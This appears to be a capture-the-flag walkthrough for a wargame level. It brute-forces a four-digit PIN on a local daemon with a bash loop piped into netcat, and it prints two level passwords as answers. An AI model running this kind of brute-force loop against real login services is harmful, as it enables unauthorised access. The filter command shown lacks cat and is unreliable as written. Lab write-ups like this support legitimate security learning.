In this lvl we need to do bruteforcing on the daemon listening on port 30002.
First to see the working of this daemon we use command :
 nc localhost 30002
After this we see that there's a output which tells us to input the password of the previous lvl and the number combination with space between them.
We can write a shell script to do the same
---------------------------------
Script : 
#!/bin/bash
bandit24="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
for i in {0000..9999};do
        echo "$bandit24 $i"
done | nc localhost 30002 >> result.txt
----------------------------------
{ 
Working of the script : First we declare a variable called bandit24 with the value of the password which will be different for you.
Then we use the for loop to traverse all the possible values that the variable can.
Then we use echo command with the value of those variables.
Then we pipe it to the nc localhost and then append the result in the text file called result.txt .
When we cat this we see a lot of "Wrong" which can be useful to get a uniq line by using the command : 

result.txt | grep -v "Wrong"

This is used to give output of every result except from the result starting with word "Wrong". {Make sure to be case-sensitive}
}
----------------------------------
Password : p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d